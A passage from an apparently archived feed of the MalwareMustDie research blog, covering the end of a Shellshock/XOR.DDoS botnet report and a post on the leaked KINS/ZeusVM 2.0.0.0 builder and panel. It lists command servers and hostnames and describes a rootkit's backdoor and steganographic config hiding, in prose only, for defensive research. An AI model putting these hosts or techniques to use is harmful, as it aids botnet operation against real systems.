(May 2014)\u003Cbr \/\u003E115.23.172.47 (current)\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E\u003C\/pre\u003EThis is strange since many of the Korea IP addresses was used in his infrastructure, I think S. Korea cyber law enforcement has to notice this matter..  \u003Cp\u003E\u003Ch2\u003EThe \u003Cb\u003E\"xwsniff rootkit\" \u003C\/b\u003Esource code\u003C\/h2\u003E \u003Cp\u003EFor this part, I made a video to show what \"xwsniff rootkit\" source code is, which showing all of the source code and that is more than words..and this is an evidence of cyber crime. This rootkit is found in the CNC in several places, including in the job.rar, a package which is used to aim the target. Undoubtedly that one of their objective is to root the infected server. This is the safest way for you to peek and study what this rootkit does for mitigation purpose ..and yes we secured this source code.   \u003Cp\u003EThis \"xwsniff rootkit\" package installer is including the FTP daemon (now we know WHY they stopped the ftp pid isn't it?), OpenSSH, and PAM source code, to be compiled together with the rootkit parts combined with the \"stealth rootkit\" and it has its own kernel's source code too. The NIX system who got infected by this rootkit will be badly damaged, no easy way to clean this rootkit manually, so I suggest you to reinstall the box. This rootkit is designed to aim the Linux platform only, but with a little modification all NIX boxes can be aimed too.  \u003Cp\u003EFor the functionality, it has the invincible function designed to make the victims didn't know whether the server was infected, backdoor with shell, and http-downloader, with additional some several functions. Ok ok..enough of \"promotion\"..let's go straight to see the below video, enjoy!\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/ME_RKZh8ckk?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Ch2\u003EBotnet CNC infrastructure\u003C\/h2\u003E \u003Cp\u003EBelow is the the list of overall IP of hosts used for this infection campaign: \u003Cpre class=\"brush: asm\"\u003E\"43.255.188.2\" (shellshock landing)\u003Cbr \/\u003E\"103.20.195.254\" (shellshock landing)\u003Cbr \/\u003E\"122.10.85.54\"  (shellshock landing)\u003Cbr \/\u003E\"103.240.141.54\" (Xor.DDoS CNC server)\u003Cbr \/\u003E\"211.110.1.32\" (Xor.DDoS CNC server)\u003Cbr \/\u003E\"115.23.172.31\" (.IptabLes|x download server)\u003Cbr \/\u003E\"115.23.172.47\" (.IptabLes|x download server)\u003Cbr \/\u003E\"61.33.28.194\" (.IptabLes|x download server)\u003Cbr \/\u003E\"115.23.172.6\" (Iptables|x previous IP record)\u003Cbr \/\u003E\u003C\/pre\u003ETheir location is in: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Cr2XcSqnP_o\/VaivrV_Xt8I\/AAAAAAAASmQ\/Tn6iVZWuAjI\/s1720-Ic42\/045.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Cr2XcSqnP_o\/VaivrV_Xt8I\/AAAAAAAASmQ\/Tn6iVZWuAjI\/s580-Ic42\/045.png\u003E\u003C\/a\u003E \u003Cp\u003EBelow is the list of overall hostnames used for this infection: \u003Cpre class=\"brush: asm\"\u003Ekill.et2046.com\u003Cbr \/\u003Esb.et2046.com\u003Cbr \/\u003Ewww1.gggatat456.com\u003Cbr \/\u003EGroUndHog.MapSnode.CoM\u003Cbr \/\u003E\u003C\/pre\u003E\u003Cp\u003E\u003Ch2\u003EFollow up \u0026 prologue\u003C\/h2\u003E \u003Cp\u003EA lot of follow up has to be done for this case. For the samples, we uploaded them all to VT, including the killfile XOR.DDoS downloader ELF module. But we don't share the rootkit except to antivirus\/filtration industries and to law enforcement. It's a dangerous tool. Please read our LEGAL DISCLAIMER for that matter here--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/p\/the-rule-to-share-malicious-codes-we.html\"\u003Elink\u003C\/a\u003E] .Give us time to prepare the package for sharing, so bear the slow follow. Send us your request in the comment part with using your entity's domain's email addresses.  \u003Cp\u003EWe will share samples to \u003Cb\u003Ekernelmode\u003C\/b\u003E for researchers only, and Virus Total.\u003Cbr\u003EThe Linux\/KillFile was added to kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3944\"\u003Elink\u003C\/a\u003E] and VirusTotal [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/6e5dcfbc9d8368470bd846b6f1cf4faed9aff64ff2fdf8aa023425cb6ac5d535\/analysis\/1437120536\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E.IptabLes|x botnet CNC tool WInPE(.NET) is limited shared in kernelmode [\u003Ca href=http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3468\u0026p=26320#p26320\u003Elink\u003C\/a\u003E] \u003Cbr\u003EThe others are in the VirusTotal (check for hashes) \u0026 not shared in kernelmode because infected by dangerous other virus.\u003Cbr\u003EThe rootkit source code is shared started from July 20th 2015, and accepting request from now. \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E Send comment in \u003Ca href=\"http:\/\/t.co\/gBbPB6FVKv\"\u003Ehttp:\/\/t.co\/gBbPB6FVKv\u003C\/a\u003E with your company email address ONLY \u0026amp; explain who you are.\u0026#10;The archive will be sent.\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/622256242359037952\"\u003EJuly 18, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EEmerging Threat good folks was releasing the open IDS signature for protecting the users for product\/open source that uses it: \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EAdditional sigs for \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/Xor.DDoS \u0026amp; Linux\/IptabLes|x \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E was released by \u003Ca href=\"https:\/\/twitter.com\/EmergingThreats\"\u003E@EmergingThreats\u003C\/a\u003E, (thx!) for IDS \u003Ca href=\"http:\/\/t.co\/HcCLrAlKm3\"\u003Epic.twitter.com\/HcCLrAlKm3\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/623302407242420228\"\u003EJuly 21, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThe blog will be added with additional information here and there, it is a very tiring work to wrote \u0026 test these non-stop, I will improve this post step by step after released. I apologize for the misspell \u0026 bad typing.   \u003Cp\u003EThis project is team work of MalwareMustDie ELF team mates who did a good work supporting the case. And to fellow researchers who were helping is with support. findings, advise and information, You guys rock! We can not be here this long if you're not around. Special thank's to folks in DHA\/Dallas Hackers Association [\u003Ca href=\"http:\/\/dallashackersassociation.com\/\"\u003Elink\u003C\/a\u003E], they're very cool guys, listen up to their latest interesting podcast (DHAfter Hours), it's mentioning MMD [\u003Ca href=\"https:\/\/soundcloud.com\/shadowsystems\/dhafter-hours-july-2015\"\u003Elink\u003C\/a\u003E]. Respect!  \u003Cp\u003E\u003Ch2\u003EFollow up\u003C\/h2\u003E\u003Cp\u003EThe attacks are still coming, detected in August 4th 2015, using SAME infrastructure to infect since the payloads are still in there.  \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E.\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E 175.126.123.228 is the XOR.DDOS gangs SSH bruting scheme. \u003Ca href=\"https:\/\/twitter.com\/hashtag\/BLOCK?src=hash\"\u003E#BLOCK\u003C\/a\u003E this IP and also 175.126.82.235\u0026#10;\u003Ca href=\"https:\/\/t.co\/S5mWuMNDfJ\"\u003Ehttps:\/\/t.co\/S5mWuMNDfJ\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/629482695882477570\"\u003EAugust 7, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E\u003Cp\u003E#MalwareMustDie"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/3695077403403160410\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0037-2015-bad-shellshock.html#comment-form","title":"4 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3695077403403160410"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3695077403403160410"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/07\/mmd-0037-2015-bad-shellshock.html","title":"MMD-0037-2015 - A bad Shellshock \u0026 Linux\/XOR.DDoS CNC \"under the hood\""}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-e_8b4bhZJfs\/VaRpNcuEF4I\/AAAAAAAASe4\/Ool6oV8DwGQ\/s72-c\/001.png","height":"72","width":"72"},"thr$total":{"$t":"4"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-396585688706408128"},"published":{"$t":"2015-07-05T07:27:00.000-07:00"},"updated":{"$t":"2016-01-24T14:02:35.292-08:00"},"title":{"type":"text","$t":"MMD-0036-2015 - KINS (or ZeusVM) v2.0.0.0 tookit (builder \u0026 panel source code) leaked."},"content":{"type":"html","$t":"\u003Cb\u003E\u003Cp\u003E\u003Cfont color=red\u003EThis sharing has been closed due to time limit (60days) - Thank you\u003C\/font\u003E\u003C\/b\u003E \u003Cp\u003E\u003Ch2\u003EThe background\u003C\/h2\u003E \u003Cp\u003EKINS (or ZeusVM to be precised) v2.0.0.0 tookit (builder \u0026 panel source code) was leaked and spread in all over the internet. On Jun 26th 2015 we were informed (thank you Xylit0l) about this and after several internal discussion, considering that: \u003Cb\u003E\"\u003Ci\u003EStill so many bad guys know about this than good guys..\u003C\/i\u003E\"\u003C\/b\u003E today we decided to raise warning about this matter by this post. So this is an information to those who may not know about the leaked package yet, and\/or maybe want to have the archive of what has leaked from the trusted source.  \u003Cp\u003ETogether with this warning also we would like to inform that \u003Cb\u003EKINS version 3 is on the black market now with the price of 5k according to a certain crook's affiliated forum\u003C\/b\u003E.  \u003Cp\u003EThis is a team work, two friends Xylit0l [\u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003Elink\u003C\/a\u003E] and unixfreaxjp [\u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003Elink\u003C\/a\u003E] are on the case building this report, testing, recording, screenshots, takedown sites that spread the leaked packages as much as possible..  \u003Cp\u003E\u003Ch2\u003EWhat was leaked exactly?\u003C\/h2\u003E \u003Cp\u003EWhat was leaked is \u003Ci\u003ENOT KINS version 2.0.0.0 source code\u003C\/i\u003E but the KINS version 2.0.0.0 \u003Cb\u003Ebuilder binary\u003C\/b\u003E, as per seen in the below screenshot (taken by Xylit0l).. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-A785iSGOvEM\/VZi1qB7B_TI\/AAAAAAAASYg\/B2tOGqkpEuY\/s1606\/001_phixr.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-A785iSGOvEM\/VZi1qB7B_TI\/AAAAAAAASYg\/B2tOGqkpEuY\/s580\/001_phixr.png\u003E\u003C\/a\u003E \u003Cp\u003E..and the panel's source code as per shown in the video embedded to this post. Pictures of KINS used web panels are as the below images (taken by Xylit0l). It shows the classic style of \u003Cb\u003EZeuS botnet panel\u003C\/b\u003E: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-w6ucFsqtI9I\/VZi0clTRQNI\/AAAAAAAASYQ\/1goYN7bqGns\/s1576\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-w6ucFsqtI9I\/VZi0clTRQNI\/AAAAAAAASYQ\/1goYN7bqGns\/s250\/003.png\u003E\u003C\/a\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Ye9hJetAYGk\/VZi0cqTeT7I\/AAAAAAAASYU\/yNt4CzihyZQ\/s1690\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Ye9hJetAYGk\/VZi0cqTeT7I\/AAAAAAAASYU\/yNt4CzihyZQ\/s250\/004.png\u003E\u003C\/a\u003E \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0fsgdk-8GVs\/VZnZpEjG6_I\/AAAAAAAASa4\/H9xhiKznrts\/s1640\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0fsgdk-8GVs\/VZnZpEjG6_I\/AAAAAAAASa4\/H9xhiKznrts\/s250\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EPictures\/info posted are MMD research material bound to legal disclaimer\u003C\/i\u003E--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/p\/the-rule-to-share-malicious-codes-we.html\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EEventhough the name used by the coder is \u003Cb\u003EKINS 2.0.0.0.\u003C\/b\u003E the \u003Ci\u003Ebuilder configuration\u003C\/i\u003E and \u003Ci\u003Ethe binary generated by the builder\u003C\/i\u003E is of \u003Cb\u003EZeusVM (version 2.0.0.0)\u003C\/b\u003E and is a completely different to previous KINS version we announced in here--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2013\/10\/kins-source-code-for-view-download.html\"\u003Elink\u003C\/a\u003E].   \u003Cp\u003EPrevious KINS version don't use \u003Cb\u003Esteganography (way of hiding information by embedding messages within other\u003C\/b\u003E, seemingly harmless messages, in this case Zeusvm hides configuration codes embedded in JPG file) while this one do, and the generated ZeusVM bot binary is similar to ZeusVM v1 and v2 samples posted in kernelmode repository--\u003E[\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3205\u0026hilit=zeusvm\"\u003Elink\u003C\/a\u003E] \u003Cb\u003EThis is why we put ZeusVM in the title of the post\u003C\/b\u003E, an evidence that KINS has adapted ZeusVM technology in their malware. This is maybe a bit confusing if you don't follow recent ZeuS malware evolution time frame, but it's the fact of what had been found \u0026 analyzed by experts.  \u003Cp\u003E\u003Ch2\u003EEnough talking, show us the package!\u003C\/h2\u003E \u003Cp\u003EBelow is the video of what has been leaked. The video shows you: \u003Cb\u003E(1) the archive information and some leak sources\u003C\/b\u003E, \u003Cb\u003E(2) the builder and its general demonstration\u003C\/b\u003E (JPG config demo is in the next video), \u003Cb\u003E(3) the panel and its code\u003C\/b\u003E, and the (4) \u003Cb\u003EZeusVM web injection proof of concept \u003C\/b\u003Escreenshots after tested by Xylit0l in the latest version of the Firefox browser (yes, it is working fine in IE). I took the video during testing.  \u003Cp\u003EPoC Video #1:  \u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/-OLOVNDLyw8?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003E\u003Ci\u003EPS: The comment in 2:34 has a mistake. It supposed to be \"The binary \u0026 crypted module files\"\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003EWhere is that \u003Ci\u003ESteganography \u003C\/i\u003EPoC?\u003C\/h2\u003E \u003Cp\u003EBelow is the video demonstrating the \u003Cb\u003ESteganography technique\u003C\/b\u003E used by the KINS\/ZeusVM 2.0.0.0. The demonstration is showing us that builder\u003Cb\u003E can inject encrypted configuration code of KINS2\/ZeusVM2 to any JPG file\u003C\/b\u003E feed to the builder to camouflage the config. We compare the \"before\" and \"after\" code injection data of the JPG files used \u0026 generated in hex editor for comparison detail. Xylit0l and I discussed a lot to get the right injecting test scheme with correct template of its configuration..finally made it right. Sorry, we break malware apart but not using them.  \u003Cp\u003EPoC Video #2:  \u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/nlJuuYAtSWA?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Cb\u003EAs additional information to these videos:\u003C\/b\u003E \u003Cp\u003E1. This is list of blocked IP by KINS\/ZeusVM 2.0.0.0 panel's \u003Cb\u003E.htaccess\u003C\/b\u003E--\u003E[\u003Ca href=\"https:\/\/pastebin.com\/5hi8KqZ9\"\u003Elink\u003C\/a\u003E] \u003Cbr\u003E2. The mod files built in hex (head):\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-0hdXnvwPSog\/VZk3GEPTRKI\/AAAAAAAASZM\/ug_Akdcwr_Q\/s1720\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-0hdXnvwPSog\/VZk3GEPTRKI\/AAAAAAAASZM\/ug_Akdcwr_Q\/s580\/011.png\u003E\u003C\/a\u003E\u003Cbr\u003E3. The log of correct configured building:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1nlanD7XG8M\/VZk3GFLrOgI\/AAAAAAAASZI\/JK1d3Drmvu8\/s1640\/012.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1nlanD7XG8M\/VZk3GFLrOgI\/AAAAAAAASZI\/JK1d3Drmvu8\/s580\/012.png\u003E\u003C\/a\u003E\u003Cbr\u003E4. The SHA256 of the builder: \u003Cb\u003E7b6cc23d545dea514628669a1037df88b278312f495b97869b40882ca554fa9a\u003C\/b\u003E [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/7b6cc23d545dea514628669a1037df88b278312f495b97869b40882ca554fa9a\/analysis\/\"\u003EVT\u003C\/a\u003E] \u003Cbr\u003E5. In Botconf [\u003Ca href=\"https:\/\/www.botconf.eu\/\"\u003Elink\u003C\/a\u003E] 2014 conference our friend \u003Cb\u003E@MAK of CERT Polska\u003C\/b\u003E [\u003Ca href=\"http:\/\/www.cert.pl\/\"\u003Elink\u003C\/a\u003E] presented a good research paper of ZeusVM threat that can be used as reference to ID the binary built--\u003E[\u003Ca href=\"https:\/\/www.botconf.eu\/wp-content\/uploads\/2014\/12\/2014-3.6-ZeuS-Meets-VM-%E2%80%93-Story-so-Far.pdf\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003E\u003Ch2\u003ESnapshot of important codes\u003C\/h2\u003E \u003Cp\u003EThe version, template built date and default config items: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-wgcApS1IAv8\/VZmJA6PDWqI\/AAAAAAAASZo\/cSdvk9DPX00\/s1512\/1001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-wgcApS1IAv8\/VZmJA6PDWqI\/AAAAAAAASZo\/cSdvk9DPX00\/s450\/1001.png\u003E\u003C\/a\u003E \u003Cp\u003EThe \"kinsdb\" was clearly stated in MySQL database name of the botnet panel too: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-HP8y7aRDGXM\/VZmJA6KH2UI\/AAAAAAAASZk\/xPdGWxUhwpM\/s1512\/1002.png\"\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-HP8y7aRDGXM\/VZmJA6KH2UI\/AAAAAAAASZk\/xPdGWxUhwpM\/s450\/1002.png\u003E\u003C\/a\u003E \u003Cp\u003EThe PHP encryption function spotted in panel's source code to encrypt the database: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-bNbqedbOsMw\/VZmJA-62SCI\/AAAAAAAASZs\/isvKTmgvk6g\/s1912\/1003.png\"\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-bNbqedbOsMw\/VZmJA-62SCI\/AAAAAAAASZs\/isvKTmgvk6g\/s580\/1003.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003ESo what does it mean?\u003C\/h2\u003E \u003Cp\u003E(1) We will see more of ZeusVM (version 2.0.0.0_) botnet operated in our internet since its malware \u0026 configuration builder is \u003Cb\u003E\"FREE as air\"\u003C\/b\u003E and is \u003Cb\u003E\"go public\"\u003C\/b\u003E now, not only from usual cyber crime crooks, but anyone with this toolkit in hand can generate ZeusVM 2.0.0.0 binaries and set it to botnets via its panel; and ; (2) We also we can expect to see a KINS\/ZeusVM new version (version 3) soon too.   \u003Cp\u003EThis is a very important information for the security community. The archive is wide spreading now, we tried very hard to take down some leaked package shared in download sites one by one but it is just way out of hand. Please help us to not letting this archive spread and distributed in the internet.  \u003Cbr\u003EIt is better for all anti malware and all threat filtration industry to know and request the leaked archive and start to research the blocking and mitigation methods, if you haven't started it yet. You can get archive or builder from here or VirusTotal or from other trusted sources.  \u003Ca name=\"emerge\"\u003E\u003Cfont color=orange\u003E\u003Cp\u003E\u003Ch2\u003EThe ITW (in the wild) emerge of many KINS 2.0.0.0 leaked tookit botnets threat has been started..\u003C\/h2\u003E\u003C\/font\u003E\u003C\/a\u003E \u003Cp\u003EThis is the update of the latest information, \u003Cb\u003Ecurrent date is: Mon Jul  6 23:41:30 JST 2015\u003C\/b\u003E \u003Cp\u003EAs per shown in the video above, in the default configuration of the KINS 2.0.0.0 there is the image file of \"server.jpg\" provided by the malware coder for creating a steganographic KINS2.0.0.0 JPG injected crypted configuration file, with the graphic physical look as per below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-iEloFM24vVE\/VZqUbK_9lmI\/AAAAAAAASb8\/9PeMm3A29UE\/s2222\/server.jpg\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-iEloFM24vVE\/VZqUbK_9lmI\/AAAAAAAASb8\/9PeMm3A29UE\/s580\/server.jpg\u003E\u003C\/a\u003E \u003Cp\u003EWe follow the current detected KINS botnet up and alive operated in the internet and we found that at least 10 botnets are using the same default configuration picture and 6 of them are up and alive in the below URLs!\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/--e5rTIAUYBQ\/VZqVVgIPtEI\/AAAAAAAAScE\/m4VHqjcPcZo\/s2222\/2000.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/--e5rTIAUYBQ\/VZqVVgIPtEI\/AAAAAAAAScE\/m4VHqjcPcZo\/s580\/2000.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe bove listed URLs are KINS 2.0.0.0 steganographic config files online, generated from the builder shown in the demonstration video of leaked KINS2 toolkit in the previous section. Those URLs are currently accessible UP and ALIVE in the internet, spotted as per now.. \u003Cp\u003ESo the new botnets using the leaked package of KINS 2.0.0.0 are actually start popping up in the internet ..running by crooks or blackhats and actively in action to infect KINS 2.0.0.0 bot PC clients to some victims..are used for the bad purpose only.. \u003Cp\u003EXylit0l was advising me to add this section for security folks to notice that the leaked KINS2\" toolkit is actually has started to be used and emerged into new threat wave, and I decided the best way to convince all of you is by the video.. so I recorded the confirmation I made in video below to be used as PoC evidence of the \u003Cb\u003Emushroomed \u003C\/b\u003Eof usage for KINS 2.0.0.0 leaked toolkit, aand (maybe) can be used for the crime evidence..\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/gVCsReaAxMA?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003EFYI..we are not happy nor proud to write this.. This is sad, to know that something bad will happen and it is actually happened in front of our own eyes.. FYI, we are still trying hard to spot and to take down new shared downloaded archive of leaked toolkit distributed in several \"blackhat\" forums,to do whatever we can to reduce this threat, please help us to do so. And thank you very much to many media download service for your kindly cooperate to help us to delete the shared malicious malware toolkit, you are the true heroes for this cause.  \u003Cp\u003E\u003Ch2\u003EHow to get the archive? (for the case from MalwareMustDie, NPO)\u003C\/h2\u003E \u003Cp\u003EPlease post the comment with your email address informed for the full archive request and we will send you the download link. Your post will not be published and your email address will not be shared. But please be patient for the sharing process. All follow up will be done manually and will be logged. We will prioritize requests coming from anti virus companies and threat filtration products. Then the governments' CERT \u0026 law enforcement related research entities. We will not share to individual or unnamed request, \u003Cb\u003Ethis is a very dangerous malware building tool, a crimeware and NOT sample of malware or toys to play with\u003C\/b\u003E.  \u003Cbr\u003ENoted: We have every right also to not sharing the archive and not responding to any untrusted\/suspicious requests.  \u003Cp\u003EFor more information of our sharing policy please read our \u003Cb\u003El\u003Ci\u003Eegal disclaimer\u003C\/i\u003E\u003C\/b\u003E here--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/p\/the-rule-to-share-malicious-codes-we.html\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003E\u003Ch2\u003EAdditional section\u003C\/h2\u003E \u003Cp\u003ESeveral takedown efforts we made: (there are more of these effort than we posted here)  \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-CxmCVCuoLH4\/VZi338rbqnI\/AAAAAAAASYw\/nezImO5paGU\/s1912\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-CxmCVCuoLH4\/VZi338rbqnI\/AAAAAAAASYw\/nezImO5paGU\/s100\/009.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-BoT_0F8NvNA\/VZi338LciBI\/AAAAAAAASY0\/YsIKZii34So\/s1512\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-BoT_0F8NvNA\/VZi338LciBI\/AAAAAAAASY0\/YsIKZii34So\/s100\/010.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-sDEWm2u2zZA\/VZmlWeOZ6CI\/AAAAAAAASaE\/y6u2d26L5LE\/s1640\/1005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sDEWm2u2zZA\/VZmlWeOZ6CI\/AAAAAAAASaE\/y6u2d26L5LE\/s100\/1005.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-N_qA-Y86ZUA\/VZmlWGh7MGI\/AAAAAAAASaA\/e5gJugMsDGM\/s1512\/1004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-N_qA-Y86ZUA\/VZmlWGh7MGI\/AAAAAAAASaA\/e5gJugMsDGM\/s100\/1004.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vorRcSp5l28\/VZmoXapLsVI\/AAAAAAAASaU\/dRcatee_A0A\/s1680\/1006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vorRcSp5l28\/VZmoXapLsVI\/AAAAAAAASaU\/dRcatee_A0A\/s100\/1006.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-RukkzB3A784\/VZmoXflmGzI\/AAAAAAAASaY\/e7Tb2CJGi5M\/s1783\/1007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-RukkzB3A784\/VZmoXflmGzI\/AAAAAAAASaY\/e7Tb2CJGi5M\/s100\/1007.png\u003E\u003C\/a\u003E  \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-e_kszIi_6Nw\/VZmrL_02hRI\/AAAAAAAASak\/UXKQhgUhIxg\/s1912\/1008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-e_kszIi_6Nw\/VZmrL_02hRI\/AAAAAAAASak\/UXKQhgUhIxg\/s100\/1008.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EThe bad actors who spread this leak are ↓not noticing being taken down↓ :-)\u003C\/h2\u003E \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jKhEM1aYgzQ\/VZnraroKKvI\/AAAAAAAASbM\/QTJZiudgxVY\/s3212\/1001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jKhEM1aYgzQ\/VZnraroKKvI\/AAAAAAAASbM\/QTJZiudgxVY\/s190\/1001.png\u003E\u003C\/a\u003E   \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-paYWiw4zjDA\/VZnsz4Y-goI\/AAAAAAAASbg\/K6u4JycRBbE\/s3212\/1002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-paYWiw4zjDA\/VZnsz4Y-goI\/AAAAAAAASbg\/K6u4JycRBbE\/s190\/1002.png\u003E\u003C\/a\u003E   \u003Ca 